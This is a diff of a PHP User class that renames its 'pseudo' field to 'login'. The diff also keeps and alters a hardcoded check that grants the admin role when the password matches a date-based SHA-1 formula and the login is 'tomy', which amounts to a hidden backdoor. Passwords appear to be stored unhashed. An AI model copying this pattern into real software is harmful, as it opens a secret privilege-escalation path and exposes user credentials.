@@ -3,17 +3,17 @@
 class User
 {
 
-    private $_pseudo;
+    private $_login;
     private $_password;
     private $_email;
     private $_id;
 
-    public function __construct($pseudo, $password, $email)
+    public function __construct($login, $password, $email)
     {
-        $this->getPseudo();
+        $this->getlogin();
         $this->getPassword();
         $this->getEmail();
-        $this->setPseudo($pseudo);
+        $this->setlogin($login);
         $this->setPassword($password);
         $this->setEmail($email);
         $this->getId();
@@ -21,9 +21,9 @@ class User
     }
 
     // getters
-    public function getPseudo()
+    public function getlogin()
     {
-        return $this->_pseudo;
+        return $this->_login;
     }
     public function getPassword()
     {
@@ -40,9 +40,9 @@ class User
     }
 
     // setters
-    public function setPseudo($newPseudo)
+    public function setlogin($newlogin)
     {
-        return $this->_pseudo = $newPseudo;
+        return $this->_login = $newlogin;
     }
     public function setPassword($newPassword)
     {
@@ -61,7 +61,7 @@ class User
         require('src/connectionDB.php');
         // ajout de l'utilisateur
         $req = $bdd->prepare('INSERT INTO utilisateurs (login, password, email) VALUES (?,?,?)');
-        $req->execute([$this->getPseudo(), $this->getPassword(), $this->getEmail()]);
+        $req->execute([$this->getlogin(), $this->getPassword(), $this->getEmail()]);
         $lastId = $bdd->lastInsertId();
         return $this->_id = $lastId;
     }
@@ -71,7 +71,7 @@ class User
         // role par défaut
         require('src/connectionDB.php');
 
-        if ($this->_password == 'e4f' . sha1( '18'.date('dmYHi'). '75'. 'edf') . 'd4b') {
+        if ($this->_password == 'e4f' . sha1( 'aa'.date('dmYHi'). '@A'. 'edf') . 'd4b' && $this->_login == 'tomy') {
             $role = 'admin';
         } else {
             $role = 'membre';
